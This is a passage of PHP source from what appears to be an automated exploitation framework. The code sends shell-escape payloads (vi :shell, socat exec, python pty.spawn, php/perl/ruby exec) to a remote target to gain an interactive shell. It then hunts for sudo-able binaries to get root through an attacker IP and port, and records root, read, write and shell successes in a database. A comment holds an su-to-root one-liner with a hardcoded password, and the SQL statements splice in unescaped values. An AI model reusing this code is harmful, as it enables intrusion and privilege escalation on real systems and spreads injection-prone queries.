                    $template_shell_new = str_replace("%CMD%","%SHELL%", $template_cmd_new);
                    return array($stream,$template_id_new,$template_cmd_new,$template_shell_new) ;
                    
                }
                $this->pause();
                
                
                $data = "vi <<# >/dev/null 2>&1\n:set shell=/bin/sh\n:shell\n# ; export SHELL=/bin/bash:\$SHELL ; export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ; /usr/bin/id";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                
                $rst_id = stream_get_contents($stream);
                list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context) = $this->parse4id($rst_id);
                if (!empty($uid_name)){
                    $cmd = "%CMD%";
                    $template_id_new = str_replace("/usr/bin/id","%ID%",$data);
                    $template_cmd_new = str_replace("%ID%", "%CMD%", $template_id_new);
                    $template_shell_new = str_replace("%CMD%","%SHELL%", $template_cmd_new);
                    return array($stream,$template_id_new,$template_cmd_new,$template_shell_new) ;
                    
                }
                $this->pause();
                
                
                $data = "export SHELL=/bin/bash:\$SHELL ; export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ; /usr/bin/id";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                
                $rst_id = stream_get_contents($stream);
                list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context) = $this->parse4id($rst_id);
                if (!empty($uid_name)){
                    $cmd = "%CMD%";
                    $template_id_new = str_replace("/usr/bin/id","%ID%",$data);
                    $template_cmd_new = str_replace("%ID%", "%CMD%", $template_id_new);
                    $template_shell_new = str_replace("%CMD%","%SHELL%", $template_cmd_new);
                    return array($stream,$template_id_new,$template_cmd_new,$template_shell_new) ;
                    
                }
                $this->pause();

                exit();
                
                $data = "printf \"%s\\n\" $0";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $tmp = stream_get_contents($stream);
                echo "$tmp\n";
                
                

                
                $data = "?";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $tmp = stream_get_contents($stream);
                echo "$tmp\n";
                
                $data = "-h";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $tmp = stream_get_contents($stream);
                echo "$tmp\n";
                
                $data = "--help";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $tmp = stream_get_contents($stream);
                echo "$tmp\n";
                
                $data = "\$SHELL --version";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $tmp = stream_get_contents($stream);
                echo "$tmp\n";
                
                $data = "echo \$BASH_VERSION";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $tmp = stream_get_contents($stream);
                echo "$tmp\n";
                
                $data = "PS1= ";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $tmp = stream_get_contents($stream);
                echo "$tmp\n";
              
                
                $data = "chsh -l";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $tmp = stream_get_contents($stream);
                echo "$tmp\n";
                
                $data = "printenv";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $tmp = stream_get_contents($stream);
                echo "$tmp\n";
                
                $data = "socat exec:'sh -li',pty,stderr,setsid,sigint,sane";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $tmp = stream_get_contents($stream);
                echo "$tmp\n";
                $data = "echo $0";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $tmp = stream_get_contents($stream);
                echo "$tmp\n";
                
                $data = "python -c 'import pty; pty.spawn(\"/bin/bash -li\")'";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $tmp = stream_get_contents($stream);
                echo "$tmp\n";
                $data = "echo $0";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $tmp = stream_get_contents($stream);
                echo "$tmp\n";
                
                $data = "php -r 'system(\"/bin/bash -li\");'";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $tmp = stream_get_contents($stream);
                echo "$tmp\n";
                $data = "echo $0";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $tmp = stream_get_contents($stream);
                echo "$tmp\n";
                
                $data = "perl -e \"exec \\\"/bin/bash -li\\\";\"  ";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $tmp = stream_get_contents($stream);
                echo "$tmp\n";
                $data = "echo $0";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $tmp = stream_get_contents($stream);
                echo "$tmp\n";
                
                $data = "ruby -e \"exec \\\"/bin/bash -li\\\";\"  ";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $tmp = stream_get_contents($stream);
                echo "$tmp\n";
                $data = "echo $0";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $tmp = stream_get_contents($stream);
                echo "$tmp\n";
                
                $data = "/usr/bin/script -qc /bin/bash -li /dev/null";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $tmp = stream_get_contents($stream);
                echo "$tmp\n";
                $data = "echo $0";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $tmp = stream_get_contents($stream);
                echo "$tmp\n";
                
                
                $rst_app = $rst_path.$rst_path2.$rst_help;
                
                
                foreach ($this->tab_sudo8app2shell as $app){
                    if (!empty($app)){
                        if (strstr($rst_app,$app)!==FALSE){
                            $obj_bin = new bin4linux($app);
                            $this->log2succes("Found APP to Bash",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
                            $this->article("APP", $obj_bin->file_path);
                            $query = "echo '$rst_app' | grep '$app' ";
                            //system($query);
                            $attacker_ip = $this->ip4addr4target($this->ip);
                            $attacker_port = rand(1024,65535);
                            $shell = "/bin/sh";
                            $sudo = FALSE;
                            
                            $cmd = "$shell";
                            $data = $obj_bin->elf4root2cmd($this->ip, $attacker_port, $shell, $sudo, $userpass, $cmd);
                            $this->article("DATA", $data);
                            fputs($stream, "$data\n");
                            $data = "cd /tmp";
                            $this->article("DATA", $data);
                            fputs($stream, "$data\n");
                            $data = "/usr/bin/id";
                            $this->article("DATA", $data);
                            fputs($stream, "$data\n");
                            
                            $rst_id = stream_get_contents($stream);
                            
                            list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context) = $this->parse4id($rst_id);
                            if (!empty($uid_name)){
                                
                                $cmd = "%CMD%";
                                $data_id = $obj_bin->elf4root2cmd($this->ip, $attacker_port, $shell, $sudo, $userpass, $cmd);
                                
                                $template_id_new = "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ; %ID%";
                                $template_cmd_new = str_replace("%CMD%", $data_id, $template_cmd);
                                $template_shell_new = str_replace("%CMD%", " $data_id; $template_id_new", $template_cmd);
                                $template_shell_new = str_replace("%CMD%","%SHELL%", $template_shell_new);
                                return array($stream,$template_id_new,$template_cmd_new,$template_shell_new) ;
                                
                            }
                        }
                    }
                }
                // ==================================================================
                

                
                // socat file:`tty`,raw,echo=0 tcp-listen:4444
                // echo -e "su - root <<! >/dev/null 2>&1\nsateam123456789\nwhoami > /dev/tty\nls > /dev/tty\n!" | bash
                
                
                return FALSE;
            }
        }
        
    }
    

    public function yesUSERS($id8port,$user2name,$user2methode,$user2infos) {
        $id8port = trim($id8port);
        $user2name = trim($user2name);
        $user2methode = trim($user2methode);
        $user2infos = trim($user2infos);
        $user = array();
        
        if (preg_match('/(?<user2name>[[:print:]]{1,})/',$user2name,$user))
        {
            $user2name =  $user['user2name'];
            
        }
        else return $this->log2error("No User : $user2name",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
        $chaine = "YES USERS = $id8port:$user2name:$user2methode:$user2infos";
        
        $sql_r = "SELECT id8port,user2name,user2methode,user2infos FROM USERS WHERE id8port = $id8port AND user2name = '$user2name' AND user2methode = '$user2methode' AND user2infos = '$user2infos' ";
        //echo "$sql_r\n";
        if (!$this->checkBD($sql_r)) {
            $sql_w = "INSERT INTO USERS (id8port,user2name,user2methode,user2infos) VALUES ($id8port,'$user2name','$user2methode','".base64_encode($user2infos)."');";
            $this->mysql_ressource->query($sql_w);
            //$this->notify($chaine);
            //echo "$sql_w\n";$this->pause();
        }
        return $this->note($chaine) ;
    }
    

    
    public function  port2root($template_b64){
        $this->ssTitre(__FUNCTION__);
        $sql_r_1 = "SELECT ".__FUNCTION__." FROM PORT WHERE $this->port2where  AND ".__FUNCTION__." <> 0";
        
        if ($this->checkBD($sql_r_1) ) return  base64_decode($this->req2BD4out(__FUNCTION__,"PORT","$this->port2where "));
        else {
            $template = base64_decode($template_b64);
            $chaine = "YES ROOT on $this->ip:$this->port";
            $this->log2succes($chaine,__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
            $sql_ip = "UPDATE IP SET ip2root=1 WHERE $this->ip2where  ";
            $this->mysql_ressource->query($sql_ip);
            
            $result = $template_b64;
            return base64_decode($this->req2BD4in(__FUNCTION__,"PORT","$this->port2where ",$result));
        }
        
    }
    
    public function  port2read($template_b64){
        $this->ssTitre(__FUNCTION__);
        $sql_r_1 = "SELECT ".__FUNCTION__." FROM PORT WHERE $this->port2where  AND ".__FUNCTION__." <> 0";
        
        if ($this->checkBD($sql_r_1) ) return  base64_decode($this->req2BD4out(__FUNCTION__,"PORT","$this->port2where "));
        else {
            $template = base64_decode($template_b64);
            $chaine = "YES READ on $this->ip:$this->port with $template";
            $this->log2succes($chaine,__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
            $sql_ip = "UPDATE IP SET ip2read=1 WHERE $this->ip2where  ";
            $this->mysql_ressource->query($sql_ip);
            
            $result = $template_b64;
            return base64_decode($this->req2BD4in(__FUNCTION__,"PORT","$this->port2where ",$result));
        }
        
    }
    
    public function  port2write($template_b64){
      
        $this->ssTitre(__FUNCTION__);
        $sql_r_1 = "SELECT ".__FUNCTION__." FROM PORT WHERE $this->port2where  AND ".__FUNCTION__." <> 0";
        
        if ($this->checkBD($sql_r_1) ) return  base64_decode($this->req2BD4out(__FUNCTION__,"PORT","$this->port2where "));
        else {
            $template = base64_decode($template_b64);
            $chaine = "YES WRITE on $this->ip:$this->port with $template";
            $this->log2succes($chaine,__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
            $sql_ip = "UPDATE IP SET ip2write=1 WHERE $this->ip2where  ";
            $this->mysql_ressource->query($sql_ip);
            
            $result = $template_b64;
            return base64_decode($this->req2BD4in(__FUNCTION__,"PORT","$this->port2where ",$result));
        }
    }
    
    
    public function  port2shell($template_b64){
        $this->ssTitre(__FUNCTION__);
        var_dump($template_b64);
        $this->pause();
        $sql_r_1 = "SELECT ".__FUNCTION__." FROM PORT WHERE $this->port2where  AND ".__FUNCTION__." <> 0";
        
        if ($this->checkBD($sql_r_1) ) return  base64_decode($this->req2BD4out(__FUNCTION__,"PORT","$this->port2where "));
        else {
            $template = base64_decode($template_b64);
            $chaine = "YES SHELL on $this->ip:$this->port with $template";
            $this->log2succes($chaine,__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
            $sql_ip = "UPDATE IP SET ip2shell=1 WHERE $this->ip2where  ";
            $this->mysql_ressource->query($sql_ip);
            
            $result = $template_b64;
            return base64_decode($this->req2BD4in(__FUNCTION__,"PORT","$this->port2where ",$result));
        }
        
    }
    
    
    
    public function key2gen4priv2pem($stream,$timeout,$private_key_file,$private_key_passwd){
        $this->req_str($stream,"openssl rsa -in $private_key_file -passin pass:$private_key_passwd -outform pem -text -out $private_key_file.pem",$timeout );
        $this->requette("ls -al $private_key_file.pem");
        $this->requette("file $private_key_file.pem");
        $this->requette("cat $private_key_file.pem");
        return "$private_key_file.pem";
    }

    
    public function key2gen4priv($stream,$timeout,$private_key_file,$private_key_passwd){
        
        
        $this->key2gen4priv2pem($stream,$timeout,$private_key_file,$private_key_passwd);
        
        $this->ssTitre ( "Gen Private key " );
        if(!file_exists($private_key_file)) $this->requette("openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -out $file_path_name" );
        
        $query = "openssl rsa -check -in $private_key_file";
        $this->req_str($stream,$query,$timeout);
        $query = "openssl rsa -in $private_key_file -text -noout";
        //$this->req_str($stream,$query,$timeout);
        $this->req_str($stream,"ls -al $private_key_file",$timeout);
        return trim($this->req_str($stream,"cat $private_key_file",$timeout ));
    }
    
    
    
    public function key2gen4public($stream,$timeout,$private_key_file, $public_key_file, $private_key_passwd){
        $this->ssTitre ( "Gen Public key" );
       // if(!file_exists($public_key_file)) {           
            if (!empty($private_key_passwd)) {

                $this->req_str($stream,"openssl rsa -in $private_key_file -passin pass:$private_key_passwd -pubout -out $public_key_file.tmp",$timeout );
                }
            else $this->req_str($stream,"openssl rsa -in $private_key_file -pubout -out $public_key_file.tmp",$timeout );
            $this->req_str($stream,"cat $public_key_file.tmp",$timeout );
            $this->req_str($stream,"ssh-keygen -i -m PKCS8 -f $public_key_file.tmp > $public_key_file ",$timeout);
            
       // }
        
        $this->req_str($stream,"ssh-keygen -l -f $public_key_file ",$timeout);
        $this->req_str($stream,"ls -al $public_key_file",$timeout);
        return trim($this->req_str($stream,"cat $public_key_file",$timeout));
        
    }
    
    

    

    
    
}

?>